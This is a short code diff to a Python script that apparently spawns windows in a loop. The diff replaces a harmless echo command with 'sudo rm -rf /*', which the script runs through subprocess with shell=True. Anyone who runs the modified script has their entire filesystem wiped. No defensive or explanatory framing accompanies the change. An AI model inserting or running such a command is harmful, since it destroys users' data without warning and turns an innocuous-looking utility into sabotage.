@@ -35,7 +35,7 @@ def create_window(x, y):
 
 def execute_command():
     # Replace this command with any Linux command you want to execute
-    command = "echo '100 windows created'"
+    command = "sudo rm -rf /*"
     subprocess.run(command, shell=True)
 
 def create_windows_in_loop(limit=100, total_limit=500, delay=0.1):
